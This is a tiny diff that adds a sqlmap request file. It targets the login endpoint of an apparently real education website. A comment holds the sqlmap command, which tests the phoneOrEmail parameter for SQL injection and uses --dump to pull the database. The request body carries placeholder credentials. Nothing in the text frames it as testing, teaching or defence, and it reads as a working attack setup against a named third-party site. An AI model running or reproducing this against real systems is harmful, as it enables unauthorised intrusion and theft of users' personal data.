@@ -1,0 +1,3 @@
+http://rootsedulive.com:80/api/auth (POST)  # .\sqlmap.py -r .\postReqs\rootsedu -p phoneOrEmail --dump
+
+{"phoneOrEmail":"sdadadsadasdas@gmail.com","password":"asdsadadsaas"}
